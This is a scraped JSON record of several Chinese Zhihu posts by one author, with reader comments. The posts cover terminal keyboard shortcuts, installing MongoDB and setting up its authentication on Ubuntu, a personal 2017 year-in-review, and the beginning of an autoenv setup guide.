            "content": "<h2>前言</h2><p>开发过程中经常会使用到命令行，有很多命令行快捷键可以很方便的提高我们的工作效率。</p><hr/><h2>Mac iTerm2 设置</h2><p>Mac 下 iTerm2 需要设置一下才能使用一些快捷键。<br/>打开 <code>Preferences &gt; Profiles &gt; Keys</code>按下图所示选择 <code>Esc+</code>: </p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-47a8af192851377f511a182e4835e2fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1340\" data-rawheight=\"966\" class=\"origin_image zh-lightbox-thumb\" width=\"1340\" data-original=\"https://pic3.zhimg.com/v2-47a8af192851377f511a182e4835e2fe_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1340&#39; height=&#39;966&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1340\" data-rawheight=\"966\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1340\" data-original=\"https://pic3.zhimg.com/v2-47a8af192851377f511a182e4835e2fe_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-47a8af192851377f511a182e4835e2fe_b.jpg\"/></figure><hr/><h2>常用快捷键</h2><h2>移动光标</h2><ol><li><b>Ctrl-a </b>   移动光标到行首</li><li><b>Ctrl-e</b>    移动光标到行尾</li><li><b>Ctrl-f </b>   光标前移一个字符；和右箭头作用一样</li><li><b>Ctrl-b</b>    光标后移一个字符；和左箭头作用一样</li><li><b>Alt-f</b>     光标前移一个字</li><li><b>Alt-b</b>    光标后移一个字Ctrl-l清空屏幕，移动光标到左上角。clear 命令完成同样的工作</li></ol><h2>修改文本</h2><ol><li><b>Ctrl-d</b>    删除光标位置的字符</li><li><b>Ctrl-t</b>    光标位置的字符和光标前面的字符互换位置</li><li><b>Alt-t</b>     光标位置的字和其前面的字互换位置Alt-l把从光标位置到字尾的字符转换成小写字母</li><li><b>Alt-u</b>     把从光标位置到字尾的字符转换成大写字母</li></ol><h2>剪切和粘贴文本</h2><ol><li><b>Ctrl-k</b>    剪切从光标位置到行尾的文本</li><li><b>Ctrl-u</b>    剪切从光标位置到行首的文本</li><li><b>Alt-d</b>     剪切从光标位置到词尾的文本</li><li><b>Alt-Backspace</b>(Mac 使用 <b>Alt-delete</b>)    剪切从光标位置到词头的文本。如果光标在一个单词的开头，剪切前一个单词</li><li><b>Ctrl-y</b>    把剪切环中的文本粘贴到光标位置</li></ol><h2>自动补全</h2><ol><li><b>Tab</b>        自动补全</li><li><b>Alt-?</b>      显示可能的自动补全列表。在大多数系统中，你也可以完成这个通过按 两次 tab 键，这会更容易些</li><li><b>Alt-*</b>      插入所有可能的自动补全。当你想要使用多个可能的匹配项时，这个很有帮助</li></ol><h2>历史命令</h2><ol><li><b>Ctrl-p</b>    移动到上一个历史条目。类似于上箭头按键</li><li><b>Ctrl-n </b>   移动到下一个历史条目。类似于下箭头按键</li><li><b>Alt-&lt;</b>     移动到历史列表开头</li><li><b>Alt-&gt;</b>     移动到历史列表结尾，即当前命令行</li><li><b>Ctrl-r </b>   反向递增搜索。从当前命令行开始，向上递增搜索</li><li><b>Alt-p</b>    反向搜索，不是递增顺序。输入要查找的字符串，然后按下 Enter，执行搜索</li><li><b>Alt-n</b>    向前搜索，非递增顺序</li><li><b>Ctrl-o</b>   执行历史列表中的当前项，并移到下一个。如果你想要执行历史列表中一系列的命令，这很方便</li></ol><hr/><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=http%3A//billie66.github.io/TLCL/book/chap09.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">快乐的 Linux 命令行 -- 键盘高级操作技巧</a></li></ol>", 
            "topic": [
                {
                    "tag": "命令行控制", 
                    "tagLink": "https://api.zhihu.com/topics/19597109"
                }, 
                {
                    "tag": "命令行界面（CLI）", 
                    "tagLink": "https://api.zhihu.com/topics/19584946"
                }, 
                {
                    "tag": "快捷键", 
                    "tagLink": "https://api.zhihu.com/topics/19555842"
                }
            ], 
            "comments": [
                {
                    "userName": "WoodenRobot", 
                    "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                    "content": "<p>知乎写文章竟然不支持表格。。。</p>", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/33557163", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 13, 
            "title": "MongoDB 使用系列（一）-- 安装", 
            "content": "<h2>环境</h2><ul><li>系统：Ubuntu 16.04</li><li>MongoDB 版本：3.6</li></ul><h2>安装</h2><h2>添加软件源</h2><p>1.添加 MongoDB 签名到 APT</p><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927\n</code></pre></div><p>2.创建/etc/apt/sources.list.d/mongodb-org-3.6.list文件并写入命令</p><p>Ubuntu 14.04</p><div class=\"highlight\"><pre><code class=\"language-text\">$ echo &#34;deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu trusty/mongodb-org/3.6 multiverse&#34; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list\n</code></pre></div><p>Ubuntu 16.04</p><div class=\"highlight\"><pre><code class=\"language-text\">$ echo &#34;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.6 multiverse&#34; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list\n</code></pre></div><p>由于官方镜像下载速度过慢可采用国内镜像进行安装：</p><p>Ubuntu 14.04</p><div class=\"highlight\"><pre><code class=\"language-text\">echo &#34;deb http://mirrors.aliyun.com/mongodb/apt/ubuntu trusty/mongodb-org/3.6 multiverse&#34; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list\n</code></pre></div><p>Ubuntu 16.04</p><div class=\"highlight\"><pre><code class=\"language-text\">echo &#34;deb http://mirrors.aliyun.com/mongodb/apt/ubuntu xenial/mongodb-org/3.6 multiverse&#34; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.6.list\n</code></pre></div><h2>更新软件源列表</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo apt-get update\n</code></pre></div><h2>安装 MongoDB</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo apt-get install -y mongodb-org\n</code></pre></div><h2>运行 MongoDB</h2><p>1.启动 MongoDB</p><div class=\"highlight\"><pre><code class=\"language-text\">sudo service mongod start\n</code></pre></div><p>2.通过日志确认 MongoDB 启动成功</p><div class=\"highlight\"><pre><code class=\"language-text\">$ tail -10f /var/log/mongodb/mongod.log\n</code></pre></div><p>看到下列内容则为启动成功</p><div class=\"highlight\"><pre><code class=\"language-text\">[initandlisten] waiting for connections on port 27017\n</code></pre></div><p>3.关闭 MongoDB</p><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo service mongod stop\n</code></pre></div><p>4.重启 MongoDB</p><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo service mongod restart\n</code></pre></div><p>5.查看 MongoDB 状态</p><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo service mongod status\n</code></pre></div><h2>MongoDB 数据、日志及配置文件默认存放路径</h2><ol><li>数据默认存放路径：<code>/var/lib/mongodb</code></li><li>日志默认存放路径：<code>/var/log/mongodb</code></li><li>配置文件默认存放路径: <code>/etc/mongod.conf</code></li></ol><h2>用户权限设置</h2><h2>添加管理员账号</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ mongo\nMongoDB shell version v3.6.2\nconnecting to: mongodb://127.0.0.1:27017\nMongoDB server version: 3.6.2\n&gt; use admin \n&gt; db.createUser(\n   {\n     user: &#34;admin&#34;,\n     pwd: &#34;mongodb123456&#34;,\n     roles: [ { role: &#34;userAdminAnyDatabase&#34;, db: &#34;admin&#34; } ]\n   }\n)\nSuccessfully added user: {\n    &#34;user&#34; : &#34;admin&#34;,\n    &#34;roles&#34; : [\n        {\n            &#34;role&#34; : &#34;userAdminAnyDatabase&#34;,\n            &#34;db&#34; : &#34;admin&#34;\n        }\n    ]\n}\n</code></pre></div><h2>在配置文件中开启权限验证</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo vim /etc/mongod.conf\n</code></pre></div><p>在配置文件中加入：</p><div class=\"highlight\"><pre><code class=\"language-text\">security:\n  authorization: enabled\n</code></pre></div><h2>重启 MongoDB 服务</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo service mongod restart\n</code></pre></div><h2>验证权限是否生效</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ mongo\nMongoDB shell version v3.6.2\nconnecting to: mongodb://127.0.0.1:27017\nMongoDB server version: 3.6.2\n&gt; show dbs\n2018-02-01T14:39:46.976+0800 E QUERY    [thread1] Error: listDatabases failed:{\n\t&#34;ok&#34; : 0,\n\t&#34;errmsg&#34; : &#34;not authorized on admin to execute command { listDatabases: 1.0, $db: \\&#34;admin\\&#34; }&#34;,\n\t&#34;code&#34; : 13,\n\t&#34;codeName&#34; : &#34;Unauthorized&#34;\n} :\n_getErrorWithCode@src/mongo/shell/utils.js:25:13\nMongo.prototype.getDBs@src/mongo/shell/mongo.js:65:1\nshellHelper.show@src/mongo/shell/utils.js:813:19\nshellHelper@src/mongo/shell/utils.js:703:15\n@(shellhelp2):1:1\n&gt; use admin\nswitched to db admin\n&gt; db.auth(&#39;admin&#39;, &#39;mongodb123456&#39;)\n1\n&gt; show dbs\nadmin   0.000GB\nconfig  0.000GB\nlocal   0.000GB\n</code></pre></div><h2>添加普通用户</h2><div class=\"highlight\"><pre><code class=\"language-text\">&gt; use spiders\nswitched to db spiders\n&gt; db.createUser(\n... {\n...    user: &#34;spiders&#34;,\n...    pwd: &#34;spiders@2018&#34;,\n...    roles: [{ role: &#34;readWrite&#34;, db: &#34;spiders&#34; }]\n... }\n... )\nSuccessfully added user: {\n\t&#34;user&#34; : &#34;spiders&#34;,\n\t&#34;roles&#34; : [\n\t\t{\n\t\t\t&#34;role&#34; : &#34;readWrite&#34;,\n\t\t\t&#34;db&#34; : &#34;spiders&#34;\n\t\t}\n\t]\n}\n</code></pre></div><p>成功添加一个普通用户：</p><ul><li>用户名：spiders</li><li>密码：spiders@2018</li><li>权限：读写 spiders 数据库</li></ul><h2>内建角色</h2><p>1.角色介绍</p><ul><li>数据库用户角色：read、readWrite</li><li>数据库管理角色：dbAdmin、dbOwner、userAdmin</li><li>集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager</li><li>备份恢复角色：backup、restore</li><li>所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</li><li>超级用户角色：root // 这里还有几个角色间接或直接提供了系统超级用户的访问（dbOwner 、userAdmin、userAdminAnyDatabase）</li><li>内部角色：__system</li></ul><p>2.角色说明</p><ul><li>Read：允许用户读取指定数据库</li><li>readWrite：允许用户读写指定数据库</li><li>dbAdmin：允许用户在指定数据库中执行管理函数，如索引创建、删除，查看统计或访问 system.profile</li><li>userAdmin：允许用户向 system.users 集合写入，可以找指定数据库里创建、删除和管理用户</li><li>clusterAdmin：只在 admin 数据库中可用，赋予用户所有分片和复制集相关函数的管理权限</li><li>readAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的读权限</li><li>readWriteAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的读写权限</li><li>userAdminAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的 userAdmin 权限</li><li>dbAdminAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的 dbAdmin 权限</li><li>root：只在 admin 数据库中可用。超级账号，超级权限</li></ul><h2>参考</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.mongodb.com/manual/tutorial/getting-started/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">MongoDB 官方文档</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/a4e94bb8a052\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">如何对MongoDB 3.2.7进行用户权限管理配置</a></li></ul>", 
            "topic": [
                {
                    "tag": "MongoDB", 
                    "tagLink": "https://api.zhihu.com/topics/19560787"
                }
            ], 
            "comments": [
                {
                    "userName": "不系舟客", 
                    "userLink": "https://www.zhihu.com/people/1646bc543dbbcf709b91d417994eeb19", 
                    "content": "<p>之前一直在关注你的chromebook栏目。。话说我现在也在学mongodb了 :D</p>", 
                    "likes": 1, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>我的 chromebook 已经给 MacBook Pro 当垫板好长时间了😂</p>", 
                            "likes": 0, 
                            "replyToAuthor": "不系舟客"
                        }, 
                        {
                            "userName": "不系舟客", 
                            "userLink": "https://www.zhihu.com/people/1646bc543dbbcf709b91d417994eeb19", 
                            "content": "<p>我的还天天用。主要因为轻+续航长，外带很方便 XD</p>", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }, 
                {
                    "userName": "塞哥维亚", 
                    "userLink": "https://www.zhihu.com/people/c8e91a75a6e6f8ae674f01539a673106", 
                    "content": "求一个爬微博的教程😀", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/32524500", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 7, 
            "title": "回归正轨的 2017 年", 
            "content": "<p>2017 年在观看 REAL - Original Generation 街舞比赛后画上了句号。 </p><p>回顾 2017 年：</p><p>这一年阅读量急剧下降从 2016 年的 37 本书下降到 9 本。 </p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-b19aaca9ca6505567658dd4bedda9001_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2456\" data-rawheight=\"622\" class=\"origin_image zh-lightbox-thumb\" width=\"2456\" data-original=\"https://pic2.zhimg.com/v2-b19aaca9ca6505567658dd4bedda9001_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2456&#39; height=&#39;622&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2456\" data-rawheight=\"622\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2456\" data-original=\"https://pic2.zhimg.com/v2-b19aaca9ca6505567658dd4bedda9001_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-b19aaca9ca6505567658dd4bedda9001_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-c1b0d6071d97a8982df02c090adb64ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2438\" data-rawheight=\"598\" class=\"origin_image zh-lightbox-thumb\" width=\"2438\" data-original=\"https://pic2.zhimg.com/v2-c1b0d6071d97a8982df02c090adb64ad_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2438&#39; height=&#39;598&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2438\" data-rawheight=\"598\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2438\" data-original=\"https://pic2.zhimg.com/v2-c1b0d6071d97a8982df02c090adb64ad_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-c1b0d6071d97a8982df02c090adb64ad_b.jpg\"/></figure><p>这一年看了 49 部影视剧相比去年减少 6 部。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-3c69bce9c115ed362cab6a920fd2cb4e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"2472\" class=\"origin_image zh-lightbox-thumb\" width=\"2364\" data-original=\"https://pic3.zhimg.com/v2-3c69bce9c115ed362cab6a920fd2cb4e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2364&#39; height=&#39;2472&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"2472\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2364\" data-original=\"https://pic3.zhimg.com/v2-3c69bce9c115ed362cab6a920fd2cb4e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-3c69bce9c115ed362cab6a920fd2cb4e_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-c35fcd7a004cd40a1733f50465140375_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"1895\" class=\"origin_image zh-lightbox-thumb\" width=\"2364\" data-original=\"https://pic2.zhimg.com/v2-c35fcd7a004cd40a1733f50465140375_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2364&#39; height=&#39;1895&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"1895\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2364\" data-original=\"https://pic2.zhimg.com/v2-c35fcd7a004cd40a1733f50465140375_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-c35fcd7a004cd40a1733f50465140375_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-4910b2ca3ac6873b7ad0879f6c90a2bb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"1907\" class=\"origin_image zh-lightbox-thumb\" width=\"2364\" data-original=\"https://pic4.zhimg.com/v2-4910b2ca3ac6873b7ad0879f6c90a2bb_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2364&#39; height=&#39;1907&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"1907\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2364\" data-original=\"https://pic4.zhimg.com/v2-4910b2ca3ac6873b7ad0879f6c90a2bb_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-4910b2ca3ac6873b7ad0879f6c90a2bb_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-750ee2424749603d10f409d08531cd56_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2228\" data-rawheight=\"576\" class=\"origin_image zh-lightbox-thumb\" width=\"2228\" data-original=\"https://pic3.zhimg.com/v2-750ee2424749603d10f409d08531cd56_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2228&#39; height=&#39;576&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2228\" data-rawheight=\"576\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2228\" data-original=\"https://pic3.zhimg.com/v2-750ee2424749603d10f409d08531cd56_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-750ee2424749603d10f409d08531cd56_b.jpg\"/></figure><p>这一年看了 26 部纪录片相比去年减少 16 部。 </p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1145298708c86622feb1442e2812ea1f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"2086\" class=\"origin_image zh-lightbox-thumb\" width=\"2364\" data-original=\"https://pic4.zhimg.com/v2-1145298708c86622feb1442e2812ea1f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;2364&#39; height=&#39;2086&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2364\" data-rawheight=\"2086\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"2364\" data-original=\"https://pic4.zhimg.com/v2-1145298708c86622feb1442e2812ea1f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-1145298708c86622feb1442e2812ea1f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>这一年在成都又买了自行车骑了三次行。 </p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-de640d1cd5c1f207b89f25d58b629854_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1924\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic1.zhimg.com/v2-de640d1cd5c1f207b89f25d58b629854_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;720&#39; height=&#39;1924&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1924\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"720\" data-original=\"https://pic1.zhimg.com/v2-de640d1cd5c1f207b89f25d58b629854_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-de640d1cd5c1f207b89f25d58b629854_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-f360d7eb02433ead9e005ab08f2063af_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1924\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic4.zhimg.com/v2-f360d7eb02433ead9e005ab08f2063af_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;720&#39; height=&#39;1924&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1924\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"720\" data-original=\"https://pic4.zhimg.com/v2-f360d7eb02433ead9e005ab08f2063af_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-f360d7eb02433ead9e005ab08f2063af_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-770bb72396edaa24871daa66cc78a324_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1924\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic1.zhimg.com/v2-770bb72396edaa24871daa66cc78a324_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;720&#39; height=&#39;1924&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1924\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"720\" data-original=\"https://pic1.zhimg.com/v2-770bb72396edaa24871daa66cc78a324_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-770bb72396edaa24871daa66cc78a324_b.jpg\"/></figure><p>这一年买了 MacBook Pro、机械键盘、重新拾起了街舞办了张年卡 Keep on dancing! </p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-4e8b25335a58e6eb988e42572598cf6d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1440\" data-original=\"https://pic2.zhimg.com/v2-4e8b25335a58e6eb988e42572598cf6d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1440&#39; height=&#39;1080&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1440\" data-original=\"https://pic2.zhimg.com/v2-4e8b25335a58e6eb988e42572598cf6d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-4e8b25335a58e6eb988e42572598cf6d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-0d0ca6fc2f2ee13a9be86faa642c5ae3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic4.zhimg.com/v2-0d0ca6fc2f2ee13a9be86faa642c5ae3_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;4160&#39; height=&#39;3120&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"4160\" data-original=\"https://pic4.zhimg.com/v2-0d0ca6fc2f2ee13a9be86faa642c5ae3_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-0d0ca6fc2f2ee13a9be86faa642c5ae3_b.jpg\"/></figure><p>2017 所有的事都在往好的地方开始发展了，2016年曾经的几个梦想也都差不多实现，但也有很多不足的地方。</p><p>2018 年先从早睡早起开始保护革命的本钱，提高对时间的利用率，撸起袖子加油干！愿我们每一个人在 2018 年都能成为一个有趣的人。Life is short, should be fun!</p><p>最后感谢如家、红旗连锁、中国移动、易方达基金告诉我，按照阳历我又老了一岁！（Ps:排名按照发短信的时间!）</p>", 
            "topic": [
                {
                    "tag": "回顾", 
                    "tagLink": "https://api.zhihu.com/topics/19615755"
                }
            ], 
            "comments": [
                {
                    "userName": "小美", 
                    "userLink": "https://www.zhihu.com/people/9e1ac3182a52ec8f1730133d571543a3", 
                    "content": "<p>真好~ 为你的生活态度点赞哦</p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "😄瞎折腾", 
                            "likes": 0, 
                            "replyToAuthor": "小美"
                        }
                    ]
                }, 
                {
                    "userName": "侯晨曦", 
                    "userLink": "https://www.zhihu.com/people/dd5ecdcc7092eeca59cc6fd0b730b030", 
                    "content": "<p>老铁你是自由职业吗？ </p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>不是，现在是程序猿👨‍💻‍</p>", 
                            "likes": 0, 
                            "replyToAuthor": "侯晨曦"
                        }
                    ]
                }, 
                {
                    "userName": "zengpeng", 
                    "userLink": "https://www.zhihu.com/people/44bbc409ffe0be75e2be20183c641eb2", 
                    "content": "成都的！我这边德阳的！", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "mozooo", 
                    "userLink": "https://www.zhihu.com/people/5936d755d682473cc5a5f7297cb1b5f8", 
                    "content": "<p>统计读书、电影的页面看起来不像豆瓣？</p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "图片来自豆瓣，统计页面是qq空间的相册", 
                            "likes": 0, 
                            "replyToAuthor": "mozooo"
                        }, 
                        {
                            "userName": "mozooo", 
                            "userLink": "https://www.zhihu.com/people/5936d755d682473cc5a5f7297cb1b5f8", 
                            "content": "大佬 爬虫的文章要记得更新呀", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }, 
                {
                    "userName": "小阿桃", 
                    "userLink": "https://www.zhihu.com/people/2718a2652310197a838a09674d4049a0", 
                    "content": "<p>18年过得如何</p>", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/31056585", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 29, 
            "title": "懒人神器 autoenv", 
            "content": "<h2>前言</h2><p>每次去不同的项目下运行程序都要更改相对应的 Python 环境，那么有什么办法可以省去这繁琐的一步吗？答案肯定是有的，Kenneth Reitz 已经为我们实现了—— autoenv。这个人名你可能没见过，但是说起他的另一个身份你肯定知道—— <a href=\"https://link.zhihu.com/?target=http%3A//docs.python-requests.org/en/master/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Requests</a> 库的作者。</p><h2>安装</h2><h2>Mac OS X 使用 Homebrew 安装</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ brew install autoenv\n# bash 使用这条命令\n$ echo &#34;source $(brew --prefix autoenv)/activate.sh&#34; &gt;&gt; ~/.bash_profile\n# zsh 使用这条命令\n$ echo &#34;source $(brew --prefix autoenv)/activate.sh&#34; &gt;&gt; ~/.zshrc\n</code></pre></div><h2>使用 pip 安装</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ pip install autoenv\n# bash 使用这条命令\n$ echo &#34;source `which activate.sh`&#34; &gt;&gt; ~/.bashrc\n# zsh 使用这条命令\n$ echo &#34;source `which activate.sh`&#34; &gt;&gt; 